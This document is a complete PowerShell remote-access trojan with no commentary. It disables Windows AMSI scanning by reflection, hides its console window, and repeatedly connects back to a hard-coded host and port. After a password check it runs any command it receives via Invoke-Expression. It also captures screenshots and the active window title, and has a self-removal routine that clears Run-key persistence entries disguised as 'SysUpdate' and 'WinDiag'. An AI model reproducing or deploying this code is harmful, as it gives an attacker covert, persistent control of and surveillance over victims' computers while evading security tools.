try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
    $a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
} catch { }

$code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru -ErrorAction SilentlyContinue
$proc = Get-Process -Id $PID -ErrorAction SilentlyContinue
if ($proc -and $proc.MainWindowHandle -and $proc.MainWindowHandle -ne [IntPtr]::Zero) {
    $win32::ShowWindow($proc.MainWindowHandle, 0) | Out-Null
}

$ip = '192.168.1.15'
$port = 4444
$pass = "biskviti"
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$regNames = @("SysUpdate", "WinDiag") 

function Master-Kill {
    try {
        foreach ($name in $regNames) { 
            Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue 
        }
    } catch { }
    try {
        $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & exit`""
        Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch { }
    exit
}

while($true) {
    $client = $null
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        $encoder = New-Object System.Text.UTF8Encoding
        
        $authMsg = "AUTH: "
        $authBytes = $encoder.GetBytes($authMsg)
        $stream.Write($authBytes, 0, $authBytes.Length)
        $stream.Flush()
        
        $wait = 0
        while (!$stream.DataAvailable -and $wait -lt 40) { 
            Start-Sleep -Milliseconds 250
            $wait++ 
        }

        if (!$stream.DataAvailable) { 
            $client.Close()
            Start-Sleep 3
            continue 
        }

        [byte[]]$authBuffer = New-Object byte[] 512
        $bytesRead = $stream.Read($authBuffer, 0, $authBuffer.Length)
        
        if ($bytesRead -gt 0) {
            $authResponse = $encoder.GetString($authBuffer, 0, $bytesRead).Trim()
            if ($authResponse -ne $pass) {
                $failMsg = "AUTH FAIL`n"
                $failBytes = $encoder.GetBytes($failMsg)
                $stream.Write($failBytes, 0, $failBytes.Length)
                $client.Close()
                Start-Sleep 2
                continue
            }
        } else { 
            $client.Close()
            Start-Sleep 3
            continue 
        }

        $successMsg = "AUTH OK`nPS " + (Get-Location).Path + "> "
        $successBytes = $encoder.GetBytes($successMsg)
        $stream.Write($successBytes, 0, $successBytes.Length)
        $stream.Flush()

        while(($client.Connected) -and (!$stream.HasTimedOut)) {
            if (!$stream.DataAvailable) { 
                Start-Sleep -Milliseconds 50
                continue 
            }
            
            [byte[]]$cmdBuffer = New-Object byte[] 4096
            $cmdBytes = $stream.Read($cmdBuffer, 0, $cmdBuffer.Length)
            
            if ($cmdBytes -le 0) { break }
            
            $command = $encoder.GetString($cmdBuffer, 0, $cmdBytes).Trim()
            $output = ""

            if ($command -eq 'kill') { 
                Master-Kill 
            }
            elseif ($command -eq 'screen') {
                try {
                    Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);' -Name "Util" -Namespace Win32 -ErrorAction SilentlyContinue
                    $handle = [Win32.Util]::GetForegroundWindow()
                    $sb = New-Object System.Text.StringBuilder 256
                    [Win32.Util]::GetWindowText($handle, $sb, $sb.Capacity)
                    $output = "[WINDOW] " + $sb.ToString() + "`n"
                } catch { $output = "[WINDOW] Error getting window title`n" }
            }
            elseif ($command -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction SilentlyContinue
                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
                    $graphics = [Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
                    $memoryStream = New-Object IO.MemoryStream
                    $bitmap.Save($memoryStream, [Drawing.Imaging.ImageFormat]::Jpeg, 75L)
                    $output = [Convert]::ToBase64String($memoryStream.ToArray()) + "`n"
                    $graphics.Dispose()
                    $bitmap.Dispose()
                    $memoryStream.Close()
                } catch { 
                    $output = "Screenshot failed: $_`n" 
                }
            }
            else {
                try {
                    $result = Invoke-Expression $command 2>&1
                    $output = $result | Out-String
                } catch { 
                    $output = $_.Exception.Message + "`n" 
                }
            }
            
            $output = $output -replace "`r`n|\r", "`n"
            $prompt = "`nPS " + (Get-Location).Path + "> "
            $response = $encoder.GetBytes($output + $prompt)
            $stream.Write($response, 0, $response.Length)
            $stream.Flush()
        }
    } 
    catch { 
    }
    finally {
        try { if ($client) { $client.Close() } } catch { }
        try { if ($stream) { $stream.Close() } } catch { }
    }
    Start-Sleep 3
}
